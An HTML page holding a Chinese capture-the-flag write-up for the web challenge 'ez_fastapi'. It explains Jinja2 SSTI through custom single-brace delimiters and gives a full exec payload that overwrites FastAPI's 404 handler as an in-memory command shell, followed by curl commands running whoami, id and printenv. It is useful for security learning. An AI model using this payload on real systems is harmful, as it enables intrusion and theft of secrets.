@@ -1,0 +1,594 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/%5B%E7%8E%84%E6%AD%A6%E6%9D%AF%202025%5Dez_fastapi/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>[玄武杯 2025]ez_fastapi - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#2025ez_fastapi" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              [玄武杯 2025]ez_fastapi
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        入口与现象
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析过程
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么不能直接加新路由
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        利用过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="利用过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssti-404" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一步：利用 SSTI 覆盖 404 处理器
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第二步：访问不存在路径验证 RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第三步：读取环境变量拿 flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        关键 payload / 命令
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="2025ez_fastapi">[玄武杯 2025]ez_fastapi</h1>
+<h2 id="_1">题目信息</h2>
+<ul>
+<li>类型：Web</li>
+<li>题目状态：已解出</li>
+<li>目标：http://node1.anna.nssctf.cn:22800/</li>
+<li>核心漏洞：FastAPI 中自定义 Jinja2 分隔符导致的 SSTI，随后通过覆盖 404 异常处理器实现内存 RCE</li>
+</ul>
+<h2 id="flag">Flag</h2>
+<p><code>NSSCTF{4adf5ec1-5a07-4bf6-a40e-10c844a3b94b}</code></p>
+<h2 id="_2">入口与现象</h2>
+<p>先访问首页和 OpenAPI：</p>
+<pre><code class="language-text">GET /
+GET /openapi.json
+</code></pre>
+<p>接口面非常小，只有两个路由：</p>
+<pre><code class="language-json">{
+  &quot;/&quot;: &quot;GET&quot;,
+  &quot;/shellMe&quot;: &quot;GET&quot;
+}
+</code></pre>
+<p><code>/shellMe</code> 有一个查询参数 <code>username</code>，但无论传什么普通值，页面都还是：</p>
+<pre><code class="language-html">&lt;h1&gt;Welcome Guest&lt;/h1&gt;
+</code></pre>
+<p>这说明 <code>username</code> 不是直接体现在返回页里，而是很可能被用于别的后端逻辑。</p>
+<p>接着测试花括号：</p>
+<pre><code class="language-text">/shellMe?username={
+/shellMe?username={{7*7}}
+/shellMe?username={{config}}
+</code></pre>
+<p>可以观察到：</p>
+<ul>
+<li>传入普通值时，页面始终正常返回 <code>Welcome Guest</code></li>
+<li>传入单个 <code>{</code> 时直接 <code>500 Internal Server Error</code></li>
+<li>这类现象很像模板字符串在后端被额外解释</li>
+</ul>
+<h2 id="_3">分析过程</h2>
+<p>拿到 RCE 之后，先读了 <code>/app/app.py</code>，关键源码如下：</p>
+<pre><code class="language-python">from fastapi import FastAPI, Request
+from fastapi.responses import JSONResponse
+from fastapi.templating import Jinja2Templates
+from jinja2 import Environment
+import uvicorn
+
+app = FastAPI()
+templates = Jinja2Templates(directory=&quot;templates&quot;)
+
+Jinja2 = Environment(variable_start_string='{', variable_end_string='}')
+
+@app.exception_handler(404)
+async def handler_404(request, exc):
+    return JSONResponse(status_code=404, content={&quot;message&quot;: &quot;Not found&quot;})
+
+@app.get(&quot;/shellMe&quot;)
+async def shellMe(request: Request, username=&quot;Guest&quot;):
+    Jinja2.from_string(&quot;Welcome &quot; + username).render()
+    return templates.TemplateResponse(&quot;shellme.html&quot;, {&quot;request&quot;: request})
+
+def method_disabled(*args, **kwargs):
+    raise NotImplementedError(&quot;此路不通！该方法已被管理员禁用。&quot;)
+
+app.add_api_route = method_disabled
+app.add_middleware = method_disabled
+</code></pre>
+<p>这里有两个关键点：</p>
+<ol>
+<li>题目单独创建了一个 Jinja2 环境，并把变量分隔符改成了单花括号：</li>
+</ol>
+<pre><code class="language-python">Jinja2 = Environment(variable_start_string='{', variable_end_string='}')
+</code></pre>
+<p>所以这里不是常见的 <code>{{ ... }}</code>，而是：</p>
+<pre><code class="language-text">{表达式}
+</code></pre>
+<ol>
+<li><code>username</code> 被直接拼进模板字符串后执行：</li>
+</ol>
+<pre><code class="language-python">Jinja2.from_string(&quot;Welcome &quot; + username).render()
+</code></pre>
+<p>这就是标准的 SSTI，而且是无回显 SSTI，因为最终响应返回的是固定模板 <code>shellme.html</code>，不是 <code>render()</code> 的结果。</p>
+<h2 id="_4">为什么不能直接加新路由</h2>
+<p>源码里还把下面两个方法禁掉了：</p>
+<pre><code class="language-python">app.add_api_route = method_disabled
+app.add_middleware = method_disabled
+</code></pre>
+<p>也就是说常规的“内存马加新路由”走不通，需要找别的可持久化利用点。</p>
+<p>但 <code>app.add_exception_handler</code> 没有被禁，所以可以改写 404 处理器，把不存在路径变成命令执行入口。</p>
+<h2 id="_5">利用过程</h2>
+<h3 id="ssti-404">第一步：利用 SSTI 覆盖 404 处理器</h3>
+<p>核心思路是：</p>
+<ol>
+<li>通过 Jinja2 SSTI 调用 <code>exec</code></li>
+<li>获取当前运行中的 <code>FastAPI</code> app 对象</li>
+<li>用 <code>add_exception_handler</code> 注册新的 404 处理器</li>
+<li>在处理器里读取 <code>cmd</code> 参数并用 <code>os.popen</code> 执行</li>
+<li>重建 <code>middleware_stack</code> 使新处理器生效</li>
+</ol>
+<p>实际 payload 如下：</p>
+<pre><code class="language-text">{lipsum.__globals__['__builtins__']['exec'](&quot;__import__('sys').modules['app'].app.add_exception_handler(404,lambda request, exc:__import__('sys').modules['app'].app.__init__.__globals__['JSONResponse'](content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}));app=__import__('sys').modules['app'].app;app.middleware_stack=app.build_middleware_stack()&quot;)}
+</code></pre>
+<p>发包：</p>
+<pre><code class="language-bash">curl &quot;http://node1.anna.nssctf.cn:22800/shellMe?username=%7Blipsum.__globals__%5B'__builtins__'%5D%5B'exec'%5D(%22__import__('sys').modules%5B'app'%5D.app.add_exception_handler(404,lambda%20request,%20exc:__import__('sys').modules%5B'app'%5D.app.__init__.__globals__%5B'JSONResponse'%5D(content=%7B'message':__import__('os').popen(request.query_params.get('cmd')%20or%20'whoami').read()%7D));app=__import__('sys').modules%5B'app'%5D.app;app.middleware_stack=app.build_middleware_stack()%22)%7D&quot;
+</code></pre>
+<p>这一步页面依旧返回固定的 <code>Welcome Guest</code>，但内存中的 404 处理器已经被改掉了。</p>
+<h3 id="rce">第二步：访问不存在路径验证 RCE</h3>
+<p>访问任意不存在路径：</p>
+<pre><code class="language-bash">curl &quot;http://node1.anna.nssctf.cn:22800/nope?cmd=whoami&quot;
+</code></pre>
+<p>返回：</p>
+<pre><code class="language-json">{&quot;message&quot;:&quot;ctf_user\n&quot;}
+</code></pre>
+<p>继续验证：</p>
+<pre><code class="language-bash">curl &quot;http://node1.anna.nssctf.cn:22800/notfound?cmd=id&quot;
+</code></pre>
+<p>返回：</p>
+<pre><code class="language-json">{&quot;message&quot;:&quot;uid=1000(ctf_user) gid=1000(ctf_user) groups=1000(ctf_user)\n&quot;}
+</code></pre>
+<p>说明命令执行已经拿到。</p>
+<h3 id="flag_1">第三步：读取环境变量拿 flag</h3>
+<p>先看根目录：</p>
+<pre><code class="language-bash">curl &quot;http://node1.anna.nssctf.cn:22800/zzz?cmd=ls%20/&quot;
+</code></pre>
+<p>返回能看到：</p>
+<pre><code class="language-text">app
+bin
+boot
+dev
+etc
+flag
+home
+...
+</code></pre>
+<p>再直接读环境变量：</p>
+<pre><code class="language-bash">curl &quot;http://node1.anna.nssctf.cn:22800/zzz?cmd=printenv&quot;
+</code></pre>
+<p>返回里可以直接看到：</p>
+<pre><code class="language-text">FLAG=NSSCTF{4adf5ec1-5a07-4bf6-a40e-10c844a3b94b}
+</code></pre>
+<p>这就是本题 flag。</p>
+<h2 id="payload">关键 payload / 命令</h2>
+<pre><code class="language-text">SSTI:
+{lipsum.__globals__['__builtins__']['exec'](&quot;__import__('sys').modules['app'].app.add_exception_handler(404,lambda request, exc:__import__('sys').modules['app'].app.__init__.__globals__['JSONResponse'](content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}));app=__import__('sys').modules['app'].app;app.middleware_stack=app.build_middleware_stack()&quot;)}
+
+验证 RCE:
+curl &quot;http://node1.anna.nssctf.cn:22800/nope?cmd=whoami&quot;
+
+拿 flag:
+curl &quot;http://node1.anna.nssctf.cn:22800/zzz?cmd=printenv&quot;
+</code></pre>
+<h2 id="_6">总结</h2>
+<p>这题的关键不是传统的 <code>{{ ... }}</code>，而是源码里把 Jinja2 变量分隔符改成了单花括号 <code>{ ... }</code>，所以普通 SSTI 测试姿势很容易走偏。</p>
+<p>同时题目专门禁掉了 <code>add_api_route</code> 和 <code>add_middleware</code>，逼着我们换个角度做“内存持久化”。最终通过覆盖 404 异常处理器，把任意不存在路径变成命令执行入口，再从环境变量里直接拿到 flag。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
